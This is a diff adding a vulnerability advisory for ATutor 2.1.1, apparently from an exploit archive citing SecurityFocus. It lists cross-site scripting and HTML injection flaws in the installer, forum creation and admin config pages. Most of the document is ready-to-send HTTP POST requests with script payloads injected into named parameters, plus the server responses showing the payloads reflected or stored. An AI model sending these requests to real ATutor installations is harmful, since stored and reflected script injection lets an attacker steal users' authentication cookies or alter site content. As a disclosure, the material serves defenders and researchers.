@@ -1,0 +1,83 @@
+source: http://www.securityfocus.com/bid/65744/info
+
+ATutor is prone to multiple cross-site scripting vulnerabilities and a HTML-injection vulnerability.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.
+
+ATutor 2.1.1 is vulnerable; other versions may also be affected. 
+
+1. During installation: xss and sql insertion:
+
+---<request>---
+POST /k/cms/atutor/ATutor/install/install.php HTTP/1.1
+Host: www.example.com
+(...)
+Content-Length: 191
+
+action=process&step=2&new_version=2.1.1&db_host=localhost&db_port=3306&db_login=root&db_password=superpass&db_name='%3e"%3e%3cscript%3ealert(1)%3c%2fscript%3e&tb_prefix=AT_&submit=Next+%BB+
+---<request>---
+
+
+---<response>---
+<ul><li>Database <b>\'>\"><script>alert(1)</script></b> created successfully.
+---<response>---
+
+--> tb_prefix and new_version parameter are also vulnerable.
+
+
+# ==============================================================
+# 2. XSS
+
+---<request>---
+POST /k/cms/atutor/ATutor/install/install.php HTTP/1.1
+Host: www.example.com
+(...)
+Content-Length: 667
+
+action=process&form_admin_password_hidden=5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8&form_account_password_hidden=5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8&step=3&step2%5Bnew_version%5D='%3e"%3e%3cscript%3ealert(1)%3c%2fscript%3e&step2%5Bdb_host%5D=localhost&step2%5Bdb_port%5D=3306&step2%5Bdb_login%5D=root&step2%5Bdb_password%5D=superpass&step2%5Bdb_name%5D=atutor&step2%5Btb_prefix%5D=AT_&smtp=false&admin_username=admin&admin_password=&admin_email=admin%40here.com&site_name=Course+Server&email=admin%40here.com&just_social=0&home_url=&account_username=admin&account_password=&account_email=admin%40here.com&account_fname=admin&account_lname=admin&submit=+Next+%BB
+
+---<request>---
+
+Vulnerable to XSS are also parameters:
+step2%5Bnew_version%5D
+step2%5Bdb_host%5D
+step2%5Bdb_port%5D
+step2%5Bdb_login%5D
+step2%5Bdb_password%5D
+step2%5Bdb_name%5D
+step2%5Btb_prefix%5D
+
+
+# ==============================================================
+# 3. Persistent XSS (from admin)
+
+---<request>---
+POST /k/cms/atutor/ATutor/mods/_standard/forums/admin/forum_add.php HTTP/1.1
+Host: www.example.com
+(...)
+Content-Length: 108
+
+add_forum=true&title='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&description=aaaaaaaaaaaaaa&edit=0&submit=Save
+---<request>---
+
+---<response>---
+<span class="required" title="Required Field">*</span><label
+for="title">Title</label><br />
+    <input type="text" name="title" size="40" id="title"
+value="'>"><body/onload=alert(9999)>" />
+  </div>
+---<response>---
+
+
+
+# ==============================================================
+# 4. Edit config (from admin user):
+
+---<request>---
+POST /k/cms/atutor/ATutor/admin/config_edit.php HTTP/1.1
+Host: www.example.com
+(...)
+Content-Length: 946
+
+site_name='%3e"%3e%3cbody%2fonload%3dalert(9999)%3e&home_url=http%3A%2F%2Fwww.atutorspaces.com&default_language=en&contact_email=admin%40here.com&time_zone=0&session_timeout=20&max_file_size=10485760&max_course_size=104857600&max_course_float=2097152&max_login=5&display_name_format=1&master_list=0&allow_registration=1&allow_browse=1&show_current=1&allow_instructor_registration=1&use_captcha=0&allow_unenroll=1&email_confirmation=0&allow_instructor_requests=1&disable_create=0&email_notification=1&auto_approve_instructors=0&theme_categories=0&user_notes=0&illegal_extentions=exe+asp+php+php3+bat+cgi+pl+com+vbs+reg+pcd+pif+scr+bas+inf+vb+vbe+wsc+wsf+wsh&cache_dir=&cache_life=7200&latex_server=http%3A%2F%2Fwww.atutor.ca%2Fcgi%2Fmimetex.cgi%3F&course_backups=5&sent_msgs_ttl=120&check_version=0&fs_versioning=1&old_enable_mail_queue=0&enable_mail_queue=0&auto_install_languages=0&pretty_url=0&course_dir_name=0&apache_mod_rewrite=0&submit=Save
+---<request>---
